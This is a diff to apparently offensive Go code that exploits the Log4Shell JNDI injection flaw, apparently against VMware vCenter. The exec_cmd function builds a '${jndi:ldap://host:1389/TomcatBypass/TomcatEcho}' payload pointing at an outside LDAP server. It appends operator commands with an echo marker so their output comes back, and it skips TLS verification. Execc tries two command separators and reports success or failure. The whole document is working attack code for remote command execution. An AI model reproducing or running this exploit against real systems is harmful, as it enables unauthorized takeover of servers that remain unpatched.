@@ -130,26 +130,28 @@ func exploit(url, rmiserver string) {
 
 }
 
-func exec_cmd(url, rmiserver, command, version string) (bool, string) {
-	host := rmiserver
+func exec_cmd(url, rmiserver, command, cmd, uri string) (bool, string) {
+	host := ""
+	if rmiserver == "" {
+		target := strings.TrimLeft(url, "https://")
+		host = getIpAddr2(target)
+		// fmt.Println(host)
+	} else {
+		host = rmiserver
+	}
+
 	client := req.C()
 	client.EnableForceHTTP1()
 	// client.DisableAutoReadResponse()
 	// client.SetUnixSocket("1.sock")
 	client.EnableInsecureSkipVerify()
 	client.DisableAutoReadResponse()
-	client.SetTimeout(4 * time.Second)
+	client.SetTimeout(2 * time.Second)
 	// client.SetProxyURL("http://127.0.0.1:8080") //尽量别用burp做代理，burp2022.8会启用http2，导致vcenter报错403
 	rmi_server := ""
-	cmd := ""
-	if version == "6" {
-		rmi_server = fmt.Sprintf("${jndi:%s/Basic/TomcatEcho}", host)
-		cmd = command + " && echo nmsl"
-	} else {
-		rmi_server = fmt.Sprintf("${jndi:%s/TomcatBypass/TomcatEcho}", host)
-		cmd = command + ";echo 'nmsl'"
-	}
-	_ = cmd
+	cmd = command + cmd
+	rmi_server = fmt.Sprintf("${jndi:ldap://%s:1389%s}", host, uri)
+	// fmt.Println(rmi_server)
 	myheader := map[string]string{
 		"User-Agent":                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
 		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -203,18 +205,18 @@ func exec_cmd(url, rmiserver, command, version string) (bool, string) {
 }
 
 func Execc(url, rmiserver, command string) {
-	for i := 0; i < 5; i++ {
-		temp1, temp2 := exec_cmd(url, rmiserver, command, "7")
-		if temp1 {
-			fmt.Println(temp2)
-			return
-		}
-		temp3, temp4 := exec_cmd(url, rmiserver, command, "6")
-		if temp3 {
-			fmt.Println(temp4)
-			return
-		}
+
+	temp1, temp2 := exec_cmd(url, rmiserver, command, ";echo nmsl", "/TomcatBypass/TomcatEcho")
+	if temp1 {
+		fmt.Println(temp2)
+		return
 	}
+	temp3, temp4 := exec_cmd(url, rmiserver, command, " && echo nmsl", "/TomcatBypass/TomcatEcho")
+	if temp3 {
+		fmt.Println(temp4)
+		return
+	}
+
 	fmt.Println("[-] 利用失败或不存在漏洞.")
 }
 
